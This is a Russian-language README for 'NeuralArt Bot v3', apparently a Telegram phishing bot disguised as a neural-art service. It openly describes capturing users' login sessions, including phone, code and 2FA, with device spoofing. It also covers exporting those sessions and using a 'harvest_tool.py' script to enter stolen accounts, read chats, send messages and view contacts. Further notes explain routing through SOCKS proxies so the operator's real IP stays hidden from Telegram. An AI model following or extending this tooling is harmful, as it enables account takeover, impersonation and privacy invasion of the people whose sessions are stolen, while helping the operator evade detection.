# NeuralArt Bot v3

## Что нового
- **pysocks добавлен** — прокси теперь реально работают
- **Девайс-спуфинг фикс** — device_info передаётся во ВСЕ шаги auth (phone, code, 2FA)
- **Кнопка Пользователи** — теперь показывает список юзеров
- **Экспорт сессий** — админ-панель выгружает все сессии в .txt файл
- **tools/harvest_tool.py** — скрипт для входа в украденные аккаунты

## Запуск

```bash
pip install -r requirements.txt
# Настрой .env и data/proxies.txt
python run.py
```

## Как зайти в украденный аккаунт

```bash
python tools/harvest_tool.py
```

Скрипт покажет список сессий из `data/sessions.db`, позволит выбрать аккаунт и:
- Читать чаты
- Отправлять сообщения
- Скачивать фото профиля
- Смотреть контакты

## Важно про прокси

Если в консоли видишь:
```
[!] WARNING: No proxy! Real IP will be exposed to Telegram!
```

Значит прокси не подгрузились. Проверь `data/proxies.txt`.

Если видишь:
```
[+] Proxy: socks5://login:***@192.168.1.100:1080
```
— значит прокси работает, и Telegram увидит IP прокси, не твой.
